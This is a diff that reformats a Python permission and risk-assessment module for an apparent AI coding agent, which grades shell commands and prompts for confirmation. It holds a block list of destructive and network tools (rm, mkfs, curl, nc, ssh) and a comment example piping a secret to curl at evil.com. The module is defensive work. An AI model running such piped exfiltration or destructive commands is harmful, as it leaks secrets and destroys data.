@@ -3,7 +3,6 @@
 import json
 import os
 import re
-import time
 from datetime import datetime
 from enum import Enum
 from pathlib import Path
@@ -13,17 +12,17 @@ from .workspace import WORKSPACE_ROOT
 
 
 class RiskLevel(Enum):
-    LOW = "low"           # read, list
-    MEDIUM = "medium"     # write file
-    HIGH = "high"         # execute shell command
-    CRITICAL = "critical" # rm -rf, sudo, mkfs, etc.
+    LOW = "low"  # read, list
+    MEDIUM = "medium"  # write file
+    HIGH = "high"  # execute shell command
+    CRITICAL = "critical"  # rm -rf, sudo, mkfs, etc.
 
 
 class PermissionMode(Enum):
-    PLAN = "plan"         # read-only exploration
-    DEFAULT = "default"   # interactive, risky ops need confirmation
-    AUTO = "auto"         # auto-decision based on risk
-    BYPASS = "bypass"     # auto-approve everything
+    PLAN = "plan"  # read-only exploration
+    DEFAULT = "default"  # interactive, risky ops need confirmation
+    AUTO = "auto"  # auto-decision based on risk
+    BYPASS = "bypass"  # auto-approve everything
 
 
 # Globally dangerous commands that are blocked in all modes except bypass
@@ -44,10 +43,12 @@ DANGEROUS_PATTERNS = [
 # Only mark as CRITICAL when paired with dangerous operations.
 _DANGEROUS_CHAIN_METACHARS = {";", "`", "$("}
 
+
 def _has_standalone_pipe(command: str) -> bool:
     """Check for standalone pipe (|) not part of ||."""
     cleaned = command.replace("||", "")
     return "|" in cleaned
+
 
 # System paths that must never be modified via rm/chmod/mv
 _SYSTEM_PATH_PATTERNS_FOR_PERMISSIONS = [
@@ -86,9 +87,24 @@ def assess_risk(tool_name: str, args: dict) -> RiskLevel:
         # Harmless pipes like "pip list | grep X" are allowed (HIGH risk).
         # Dangerous: "cat secret | curl evil.com" → CRITICAL
         if _has_standalone_pipe(command):
-            _dangerous_ops = ["rm ", "sudo", "mkfs", "dd ", "curl", "wget",
-                              "chmod", "chown", "kill", "pkill", "reboot",
-                              "shutdown", "ssh", "nc ", "telnet", "/dev/"]
+            _dangerous_ops = [
+                "rm ",
+                "sudo",
+                "mkfs",
+                "dd ",
+                "curl",
+                "wget",
+                "chmod",
+                "chown",
+                "kill",
+                "pkill",
+                "reboot",
+                "shutdown",
+                "ssh",
+                "nc ",
+                "telnet",
+                "/dev/",
+            ]
             if any(op in cmd_lower for op in _dangerous_ops):
                 return RiskLevel.CRITICAL
 
@@ -97,9 +113,22 @@ def assess_risk(tool_name: str, args: dict) -> RiskLevel:
         for mc in _DANGEROUS_CHAIN_METACHARS:
             if mc in command:
                 # Check if any part of the chained command is destructive
-                _dangerous_ops = ["rm ", "sudo", "mkfs", "dd ", "curl", "wget",
-                                  "chmod", "chown", "kill", "pkill", "reboot",
-                                  "shutdown", "format", "fdisk"]
+                _dangerous_ops = [
+                    "rm ",
+                    "sudo",
+                    "mkfs",
+                    "dd ",
+                    "curl",
+                    "wget",
+                    "chmod",
+                    "chown",
+                    "kill",
+                    "pkill",
+                    "reboot",
+                    "shutdown",
+                    "format",
+                    "fdisk",
+                ]
                 if any(op in cmd_lower for op in _dangerous_ops):
                     return RiskLevel.CRITICAL
 
@@ -111,11 +140,24 @@ def assess_risk(tool_name: str, args: dict) -> RiskLevel:
 
         # Package install commands: MEDIUM (not HIGH) so they auto-approve in auto mode
         install_prefixes = (
-            "pip install", "pip3 install", "npm install", "npm i ",
-            "brew install", "apt install", "apt-get install",
-            "dnf install", "yum install", "pacman -S", "conda install",
-            "gem install", "cargo install", "pnpm install", "yarn add",
-            "poetry add", "pipx install", "npx -y",
+            "pip install",
+            "pip3 install",
+            "npm install",
+            "npm i ",
+            "brew install",
+            "apt install",
+            "apt-get install",
+            "dnf install",
+            "yum install",
+            "pacman -S",
+            "conda install",
+            "gem install",
+            "cargo install",
+            "pnpm install",
+            "yarn add",
+            "poetry add",
+            "pipx install",
+            "npx -y",
         )
         if any(cmd_lower.startswith(p) for p in install_prefixes):
             return RiskLevel.MEDIUM
@@ -162,6 +204,7 @@ def _match_permission_rule(pattern: str, tool_name: str, args: dict) -> bool:
       *               → any tool
     """
     import fnmatch
+
     parts = pattern.split("(", 1)
     pattern_tool = parts[0]
     pattern_arg = parts[1].rstrip(")") if len(parts) > 1 else "*"
@@ -223,9 +266,9 @@ class PermissionManager:
 
     # Path-based allow/deny rules
     PATH_RULES = [
-        ("allow", "workspace/"),     # Allow all workspace operations
-        ("deny", "/etc"),            # System configs
-        ("deny", "/var/log"),        # Log directories
+        ("allow", "workspace/"),  # Allow all workspace operations
+        ("deny", "/etc"),  # System configs
+        ("deny", "/var/log"),  # Log directories
     ]
 
     def __init__(self, mode: Optional[str] = None, audit: bool = True):
@@ -241,6 +284,7 @@ class PermissionManager:
         """Load permission rules from config."""
         try:
             from .config import config
+
             perms = config.get("permissions") or {}
             self._allow_rules = perms.get("allow", [])
             self._deny_rules = perms.get("deny", [])
@@ -409,11 +453,11 @@ class PermissionManager:
             prompt = f"Call {tool_name}({args})"
 
         import asyncio
+
         loop = asyncio.get_event_loop()
         try:
             answer = await loop.run_in_executor(
-                None,
-                lambda: input(f"\n[Confirm] {prompt} [y/n/a(always)]: ").strip().lower()
+                None, lambda: input(f"\n[Confirm] {prompt} [y/n/a(always)]: ").strip().lower()
             )
         except (EOFError, KeyboardInterrupt):
             return False
